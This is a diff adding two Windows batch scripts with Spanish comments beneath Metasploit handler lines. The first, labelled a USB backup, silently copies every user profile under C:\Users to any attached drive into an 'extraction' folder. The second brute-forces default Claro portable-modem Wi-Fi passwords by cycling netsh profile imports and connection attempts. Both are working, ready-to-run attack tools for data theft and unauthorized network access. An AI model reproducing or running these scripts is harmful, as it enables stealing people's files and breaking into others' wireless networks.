@@ -14,3 +14,115 @@ set LPORT 4444
 exploit
 
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+script para hacer un backup desde una usb con mucha capacidad ya que clona todos los archivos a cualquier usb que detecte conectada y 
+los guardara ahi 
+
+@echo off
+setlocal enabledelayedexpansion
+
+:: 1. BUSCADOR DE USB EXTERNA (Ignora el Disco C)
+set "target_usb="
+for %%i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    if exist %%i:\ (
+        if /i not "%%i:"=="%SystemDrive%" (
+            set "target_usb=%%i:"
+            goto :ready
+        )
+    )
+)
+
+:ready
+if "%target_usb%"=="" exit
+set "dest=%target_usb%\EXTRACCION_USERS"
+if not exist "%dest%" mkdir "%dest%"
+
+:: 2. MOTOR DE CLONACIÓN PROFUNDA
+:: /E      : Copia TODAS las subcarpetas (incluyendo las vacías).
+:: /MT:128 : Velocidad máxima usando 128 hilos de procesamiento.
+:: /XJ     : Evita "bucles" infinitos de carpetas de sistema.
+:: /R:0 /W:0 : Si un archivo está abierto, lo salta y sigue (para no trabarse).
+
+echo [+] Extrayendo perfiles completos a %target_usb%...
+robocopy "C:\Users" "%dest%" /E /MT:128 /R:0 /W:0 /XJ /NFL /NDL /NP /NC /NS
+
+:: 3. AVISO DE FINALIZACIÓN
+echo.
+echo [+] PROCESO COMPLETADO.
+start "" "%dest%"
+exit
+
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+escript para romper vulnerabilidad de modenms portatiles que siguen con la contrase;a por defectoi , este abre el power shell y intenta las 
+posiblidades de conecciones para encontrar el numero de la mac faltante que completaria la contrasena
+
+@echo off
+setlocal enabledelayedexpansion
+
+:: --- DATOS DEL LABORATORIO ---
+set /p target_ssid="Introduce el SSID de tu red: "
+echo Preparando entorno para !target_ssid!...
+
+:: 1. CREACIÓN DEL PERFIL XML TEMPORAL
+(
+echo ^<?xml version="1.0"?^>
+echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>
+echo     ^<name^>!target_ssid!^</name^>
+echo     ^<SSIDConfig^>^<SSID^>^<name^>!target_ssid!^</name^>^</SSID^>^</SSIDConfig^>
+echo     ^<connectionType^>ESS^</connectionType^>
+echo     ^<connectionMode^>manual^</connectionMode^>
+echo     ^<MSM^>^<security^>^<authEncryption^>
+echo         ^<authentication^>WPA2PSK^</authentication^>
+echo         ^<encryption^>AES^</encryption^>
+echo         ^<useOneX^>false^</useOneX^>
+echo     ^</authEncryption^>^<sharedKey^>
+echo         ^<keyType^>passPhrase^</keyType^>
+echo         ^<protected^>false^</protected^>
+echo         ^<keyMaterial^>TEMPPASSWORD^</keyMaterial^>
+echo     ^</sharedKey^>^</MSM^>
+echo ^</WLANProfile^>
+) > profile.xml
+
+:: 2. DICCIONARIO Y MANIOBRA
+set "sufijo=!target_ssid:~-5!"
+set "chars=0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z"
+
+echo Buscando coincidencia para sufijo: !sufijo!
+echo --------------------------------------------------
+
+for %%I in (CLARO claro Claro) do (
+    for %%C in (!chars!) do (
+        set "pass=%%I%%C!sufijo!"
+        
+        :: Actualizar perfil con la nueva contraseña
+        powershell -Command "(gc profile.xml) -replace 'TEMPPASSWORD', '!pass!' | Out-File -encoding ascii profile_temp.xml"
+        
+        :: Importar perfil e intentar conectar
+        netsh wlan add profile filename="profile_temp.xml" >nul
+        echo Probando: !pass!
+        netsh wlan connect name="!target_ssid!" >nul 2>&1
+        
+        :: Tiempo de espera para el Handshake (Capa 2)
+        timeout /t 4 /nobreak >nul
+        
+        :: Verificación de éxito
+        netsh wlan show interfaces | findstr /C:"!target_ssid!" >nul
+        if !errorlevel! equ 0 (
+            echo.
+            echo ==================================================
+            echo [+] CONEXION EXITOSA
+            echo [+] SSID: !target_ssid!
+            echo [+] PASSWORD: !pass!
+            echo ==================================================
+            del profile.xml profile_temp.xml
+            pause
+            exit
+        )
+    )
+)
+
+echo [X] No se pudo establecer la conexion. Revisa el Firewall (Punto 23).
+del profile.xml profile_temp.xml
+pause
